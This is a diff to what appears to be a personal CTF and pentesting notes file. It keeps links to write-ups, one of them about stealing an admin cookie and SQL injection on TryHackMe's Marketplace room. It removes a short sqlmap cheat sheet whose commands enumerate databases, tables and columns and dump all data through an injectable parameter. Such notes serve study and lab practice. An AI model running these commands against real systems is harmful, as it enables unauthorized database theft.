@@ -84,10 +84,3 @@ grep -Rwi "text"
 #### [steal admin cookie/sqli](/other/src/marketplace.md) (tryhackme:marketplace)
 #### [ohmyweb](/other/src/omyweb.md)
 
-#### sqlmap
-```bash
-sqlmap -r req.txt -p <parametr> --dbs
-sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
-sqlmap -r req.txt -D <database_name> -T <table_name> --columns
-sqlmap -r req.txt-p  -D <database_name> --dump-all
-```
